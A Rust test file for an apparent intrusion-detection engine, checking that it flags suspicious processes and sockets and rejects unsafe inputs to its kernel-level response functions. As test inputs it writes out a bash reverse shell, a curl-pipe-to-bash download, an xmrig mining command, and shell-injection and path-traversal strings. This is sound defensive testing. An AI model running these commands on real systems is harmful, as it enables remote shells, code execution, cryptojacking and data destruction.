use sentinel_engine::ai::{AnomalySeverity, BehaviorAnalyzer};
use sentinel_engine::kernel::{
    kernel_deauth_usb, kernel_freeze_process, kernel_quarantine_ip, kernel_sever_socket,
};

#[test]
fn test_entropy_calculation() {
    assert_eq!(BehaviorAnalyzer::calculate_entropy(""), 0.0);
    assert_eq!(BehaviorAnalyzer::calculate_entropy("aaaaaaa"), 0.0);

    let low_entropy = BehaviorAnalyzer::calculate_entropy("hello world");
    let high_entropy = BehaviorAnalyzer::calculate_entropy("9F8aB#$!zK2_9@xP10%qWmZ");
    assert!(high_entropy > low_entropy);
    assert!(high_entropy > 4.0);
}

#[test]
fn test_evaluate_process_normal() {
    let res = BehaviorAnalyzer::evaluate_process(
        1234,
        "firefox",
        Some("/usr/lib/firefox/firefox"),
        "/usr/lib/firefox/firefox --new-tab https://archlinux.org",
    );
    assert!(res.is_none());
}

#[test]
fn test_evaluate_process_reverse_shell() {
    let res = BehaviorAnalyzer::evaluate_process(
        9999,
        "sh",
        Some("/bin/sh"),
        "/bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    );
    assert!(res.is_some());
    let anomaly = res.unwrap();
    assert!(anomaly.score >= 60);
    assert!(anomaly.severity == AnomalySeverity::High || anomaly.severity == AnomalySeverity::Critical);
    assert!(anomaly.reasons.iter().any(|r| r.contains("reverse-shell")));
}

#[test]
fn test_evaluate_process_curl_pipe_sh() {
    let res = BehaviorAnalyzer::evaluate_process(
        8888,
        "bash",
        Some("/usr/bin/bash"),
        "curl -sSL https://malicious.domain/payload | bash",
    );
    assert!(res.is_some());
    let anomaly = res.unwrap();
    assert!(anomaly.score >= 45);
    assert!(anomaly.reasons.iter().any(|r| r.contains("remote code pipe")));
}

#[test]
fn test_evaluate_process_tmp_execution() {
    let res = BehaviorAnalyzer::evaluate_process(
        7777,
        "bad_binary",
        Some("/tmp/bad_binary"),
        "/tmp/bad_binary --run",
    );
    assert!(res.is_some());
    let anomaly = res.unwrap();
    assert!(anomaly.reasons.iter().any(|r| r.contains("/tmp")));
}

#[test]
fn test_evaluate_process_cryptominer() {
    let res = BehaviorAnalyzer::evaluate_process(
        6666,
        "xmrig",
        Some("/home/user/.local/bin/xmrig"),
        "xmrig -o stratum+tcp://xmr.pool.minergate.com:3333 -u wallet",
    );
    assert!(res.is_some());
    let anomaly = res.unwrap();
    assert!(anomaly.score >= 60);
    assert!(anomaly.reasons.iter().any(|r| r.contains("Stratum mining")));
}

#[test]
fn test_evaluate_socket_backdoor_port() {
    let res = BehaviorAnalyzer::evaluate_socket(
        Some(5555),
        "unknown_listener",
        "tcp",
        "0.0.0.0",
        4444,
    );
    assert!(res.is_some());
    let anomaly = res.unwrap();
    assert!(anomaly.score >= 45);
    assert!(anomaly.reasons.iter().any(|r| r.contains("exploit or reverse backdoor")));
}

#[test]
fn test_evaluate_socket_rogue_ssh() {
    let res = BehaviorAnalyzer::evaluate_socket(
        Some(2222),
        "python3",
        "tcp",
        "0.0.0.0",
        22,
    );
    assert!(res.is_some());
    let anomaly = res.unwrap();
    assert!(anomaly.reasons.iter().any(|r| r.contains("Non-sshd binary")));
}

#[test]
fn test_kernel_freeze_prevents_init_or_invalid_pid() {
    let res0 = kernel_freeze_process(0);
    assert!(!res0.success);
    assert!(res0.message.contains("PID <= 2"));

    let res1 = kernel_freeze_process(1);
    assert!(!res1.success);
    assert!(res1.message.contains("PID <= 2"));

    let res2 = kernel_freeze_process(2);
    assert!(!res2.success);
    assert!(res2.message.contains("PID <= 2"));

    let res_neg = kernel_freeze_process(-5);
    assert!(!res_neg.success);
}

#[test]
fn test_kernel_sever_socket_validation() {
    let res_empty = kernel_sever_socket("");
    assert!(!res_empty.success);

    let res_zero = kernel_sever_socket("0");
    assert!(!res_zero.success);
    assert!(res_zero.message.contains("Port 0 is invalid"));

    let res_loopback = kernel_sever_socket("127.0.0.1");
    assert!(!res_loopback.success);
    assert!(res_loopback.message.contains("loopback"));

    let res_invalid = kernel_sever_socket("invalid_target_text_with_spaces");
    assert!(!res_invalid.success);
}

#[test]
fn test_kernel_deauth_usb_sanitization() {
    // Rejects path traversal attempts
    let res_traversal = kernel_deauth_usb("../../../etc/passwd");
    assert!(!res_traversal.success);

    let res_dotdot = kernel_deauth_usb("1-1..2");
    assert!(!res_dotdot.success);

    let res_hidden = kernel_deauth_usb(".hidden");
    assert!(!res_hidden.success);

    // Rejects shell injection attempts
    let res_injection = kernel_deauth_usb("1-1; rm -rf /");
    assert!(!res_injection.success);

    let res_spaces = kernel_deauth_usb("1-1 2");
    assert!(!res_spaces.success);
}

#[test]
fn test_kernel_quarantine_ip_validation() {
    let res_invalid = kernel_quarantine_ip("not-an-ip-address");
    assert!(!res_invalid.success);
    assert!(res_invalid.message.contains("Invalid IP address"));

    let res_loopback = kernel_quarantine_ip("127.0.0.1");
    assert!(!res_loopback.success);
    assert!(res_loopback.message.contains("loopback"));

    let res_loopback6 = kernel_quarantine_ip("::1");
    assert!(!res_loopback6.success);
    assert!(res_loopback6.message.contains("loopback"));

    let res_unspecified = kernel_quarantine_ip("0.0.0.0");
    assert!(!res_unspecified.success);

    let res_broadcast = kernel_quarantine_ip("255.255.255.255");
    assert!(!res_broadcast.success);
}
